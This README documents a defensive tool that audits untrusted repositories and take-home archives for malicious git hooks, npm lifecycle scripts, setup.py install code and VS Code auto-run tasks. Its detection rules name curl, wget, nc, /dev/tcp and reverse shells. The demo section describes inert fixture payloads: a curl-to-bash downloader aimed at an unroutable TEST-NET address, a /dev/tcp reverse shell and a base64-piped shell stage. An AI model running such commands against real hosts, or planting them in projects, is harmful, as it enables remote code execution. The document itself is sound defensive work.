# git-smells-wrong

Containerized Git sandbox & malicious repo auditor. Safely clones, inspects,
and analyzes untrusted repositories — fake take-home assignments, random
open-source repos, mystery archives — for malicious delivery vectors
(`.git/hooks/`, package lifecycle hooks, IDE auto-run tasks) without
exposing the host environment.

Available as a single Go binary or a zero-dependency Docker image.
Both share the same flags and behavior.

## What it detects

| Rule      | Target                | Check                                                          |
|-----------|-----------------------|----------------------------------------------------------------|
| `HOOK-001`| `.git/hooks/*`        | Executable hooks (ignores `*.sample`); critical on `curl`/`wget`/`nc`, `/dev/tcp`, base64 blobs, reverse shells |
| `NPM-002` | `package.json`        | Auto-run lifecycle scripts (`preinstall`, `install`, `postinstall`, `prepack`, …) |
| `PY-003`  | `setup.py`/`setup.cfg`| Install-time code (`cmdclass`, `os.system`, `subprocess`, network imports) |
| `IDE-004` | `.vscode/tasks.json`  | Tasks with `"runOn": "folderOpen"` (execute on folder open)    |

Exit codes: `0` clean · `1` warning · `2` critical (or scan error).

## Demo walkthrough

Five minutes, nothing executed, all payloads inert by construction
(unroutable TEST-NET-1 addresses, reserved `.test` domains). You need a
binary or the image first — see [Install](#install).

**Key insight this demo teaches:** `git clone` never transports
`.git/hooks`, so the hook vector only travels inside archives (zips /
tarballs) — exactly how these lures are distributed in practice.

### 1. Scan the evil archive

```bash
git-smells-wrong scan --archive=./demo/evil-take-home.zip
```

Expect one finding per rule, all `CRITICAL`, exit `2`:

```
 SEVERITY     RULE       FILE                         TITLE
 [CRITICAL]   HOOK-001   .git/hooks/post-checkout     Malicious git hook
 [CRITICAL]   NPM-002    package.json                 Malicious npm lifecycle hook
 [CRITICAL]   PY-003     setup.py                     Malicious setup.py logic
 [CRITICAL]   IDE-004    .vscode/tasks.json           Malicious IDE auto-run task

 Network indicators (dry-run, not executed):
   - http://192.0.2.10:4444/stage2.sh
   ...

 Summary: 4 critical, 0 warning, 0 info  →  CRITICAL (exit 2)
```

No Docker? Same command through the image:

```bash
docker run --rm -v "$(pwd):/data" dattm24/git-smells-wrong:latest \
  scan --archive=/data/demo/evil-take-home.zip
```

### 2. Read the payloads

```bash
unzip -l demo/evil-take-home.zip
# index.js  setup.py  package.json  README.md
# .vscode/tasks.json  .git/hooks/post-checkout   <- only exists via archive

unzip -p demo/evil-take-home.zip .git/hooks/post-checkout
# stage 1: curl <unroutable-ip> | bash   (fake downloader)
# stage 2: bash -i >& /dev/tcp/...      (fake reverse shell)
# stage 3: echo <blob> | base64 -d | bash (decodes to "harmless-demo-fixture")
```

Each remaining file is one more auto-execution vector: `postinstall`
runs on `npm install`, `setup.py:DemoInstall` runs on `pip install`,
the VS Code task runs on folder open.

### 3. Watch them attempt (and fail)

```bash
# Decode stage 3 WITHOUT piping to a shell:
unzip -p demo/evil-take-home.zip .git/hooks/post-checkout \
  | grep '^echo' | awk '{print $2}' | base64 -d
# -> harmless-demo-fixture

# Trace the whole hook: curl hangs on the unroutable IP until timeout kills it.
# Nothing leaves your machine.
timeout 10 bash -c \
  'unzip -p demo/evil-take-home.zip .git/hooks/post-checkout | bash -x /dev/stdin'
```

### 4. Feel the triggers with benign stand-ins

The mechanisms are real even though our payloads are fake — prove it
to yourself in `/tmp`:

```bash
# Git hooks fire on checkout with zero prompting:
git init -q -b main /tmp/hookdemo
printf '#!/bin/sh\necho ">>> HOOK AUTO-RAN"\n' > /tmp/hookdemo/.git/hooks/post-checkout
chmod +x /tmp/hookdemo/.git/hooks/post-checkout
git -C /tmp/hookdemo commit -q --allow-empty -m init
git -C /tmp/hookdemo checkout -q -b demo   # >>> HOOK AUTO-RAN

# npm lifecycle scripts fire on install the same way:
mkdir -p /tmp/npmdemo
cat > /tmp/npmdemo/package.json <<'EOF'
{"name":"demo","scripts":{"postinstall":"echo '>>> POSTINSTALL AUTO-RAN'"}}
EOF
(cd /tmp/npmdemo && npm install --no-audit --no-fund)   # >>> POSTINSTALL AUTO-RAN
```

### 5. Contrast with a clean verdict

```bash
git-smells-wrong scan --repo="https://github.com/datmt/git-smells-wrong.git"
# [CLEAN] No malicious or high-risk patterns found. Verdict: CLEAN. (exit 0)
```

Rebuild the fixture or inspect sources any time:
`./demo/make-evil-zip.sh` regenerates the archive from `demo/src/`
(the hook source lives at `demo/src/hooks/` — git can't track a
`.git/` dir, which is itself the reason this vector needs an archive).
Details in `demo/README.md`.

## Install

### Option 1 — install script (Linux/macOS, amd64/arm64)

```bash
curl -fsSL https://raw.githubusercontent.com/datmt/git-smells-wrong/main/install.sh | bash
```

Pulls the latest GitHub release binary into `/usr/local/bin`
(override with `INSTALL_DIR=~/.local/bin`). Skips re-install when
already at the latest version.

> Requires a `v*` tag release with attached binaries (see
> [Releasing](#releasing)). Until then, use Option 2 or 3.

### Option 2 — Docker (no Go toolchain needed)

```bash
docker run --rm dattm24/git-smells-wrong:latest scan --help
```

### Option 3 — from source (Go 1.23+)

```bash
git clone https://github.com/datmt/git-smells-wrong.git
cd git-smells-wrong
./build.sh            # -> ./bin/git-smells-wrong
# or: make build
```

## Run

### Binary

```bash
# Scan a remote repo
git-smells-wrong scan --repo="https://github.com/evil-org/test-task.git"

# Scan a local take-home archive (.zip or .tar.gz)
git-smells-wrong scan --archive="./take-home.zip"

# JSON report to a file
git-smells-wrong scan --repo="https://github.com/evil-org/test-task.git" \
  --report="./report.json" --format=json

# SARIF report (for code-scanning dashboards)
git-smells-wrong scan --archive="./take-home.zip" \
  --report="./report.sarif" --format=sarif

# Delegate execution into the isolated container (needs Docker)
git-smells-wrong scan --repo="https://github.com/evil-org/test-task.git" --sandbox=docker
```

### Docker image

```bash
# Scan straight to STDOUT
docker run --rm dattm24/git-smells-wrong:latest \
  scan --repo="https://github.com/evil-org/test-task.git"

# Persist a JSON report via a volume mount
docker run --rm -v "$(pwd)/reports:/reports" \
  dattm24/git-smells-wrong:latest \
  scan --repo="https://github.com/evil-org/test-task.git" \
  --report="/reports/scan-result.json" --format=json

# Scan a local archive (mount it in)
docker run --rm -v "$(pwd):/data" \
  dattm24/git-smells-wrong:latest \
  scan --archive="/data/take-home.zip"
```

### Flags

| Flag        | Default  | Description                                              |
|-------------|----------|----------------------------------------------------------|
| `--repo`    | `""`     | Git URL to clone and inspect (mutually exclusive with `--archive`) |
| `--archive` | `""`     | Local `.zip` / `.tar.gz` to extract and inspect          |
| `--branch`  | `"HEAD"` | Branch/tag checked out during the trace                  |
| `--report`  | `""`     | Write report here instead of STDOUT                      |
| `--format`  | `"text"` | `text` (colored table), `json`, or `sarif`               |
| `--sandbox` | `"native"` | `native` or `docker` (re-exec inside the image)        |
| `--timeout` | `2m`     | Timeout for clone + analysis                             |

Example output:

```
 SEVERITY     RULE       FILE                         TITLE
 [CRITICAL]   HOOK-001   .git/hooks/post-checkout     Malicious git hook
 ...
 Summary: 4 critical, 0 warning, 0 info  →  CRITICAL (exit 2)
```

## Safety model

- Clones with `git clone --template=/dev/null`, so hostile global hook
  templates never land in the working directory.
- `.zip`/`.tar.gz` extraction enforces Zip-Slip protection: absolute
  paths, `..` traversal, symlinks, and non-regular tar entries are
  rejected before anything is written.
- Hooks and lifecycle scripts are **never executed** in native mode.
  The tracer does a dry-run enumeration (what *would* run) plus
  URL/IP indicator extraction. Real isolation happens via
  `--sandbox=docker` / the container image.

## Development

```bash
make build       # ./bin/git-smells-wrong (version-stamped)
make test        # go test ./...
make vet
./release.sh v0.1.0        # cross-compile tarballs into dist/v0.1.0/
./docker-build-push.sh v0.1.0   # build + push image (IMAGE=… override)
```

Scripts: `build.sh` (dev build) · `release.sh` (release tarballs) ·
`docker-build-push.sh` (image publish) · `install.sh` (remote installer).

### Releasing

1. Tag: `git tag v0.1.0 && git push origin v0.1.0`
2. CI (`.github/workflows/build.yml`) attaches
   `git-smells-wrong-<os>-<arch>` binaries to the release —
   this is what `install.sh` downloads.
3. Publish the image yourself:
   `IMAGE=dattm24/git-smells-wrong ./docker-build-push.sh v0.1.0`.

## Layout

```
cmd/git-smells-wrong/   CLI entrypoint (cobra)
internal/config/        flags + validation
internal/ingestion/     safe clone + Zip-Slip-safe extraction
internal/rules/         HOOK-001 / NPM-002 / PY-003 / IDE-004
internal/tracer/        dry-run execution monitor
internal/sandbox/       docker delegation
internal/report/        text / json / sarif + exit codes
Dockerfile              multi-stage, non-root runtime image
```
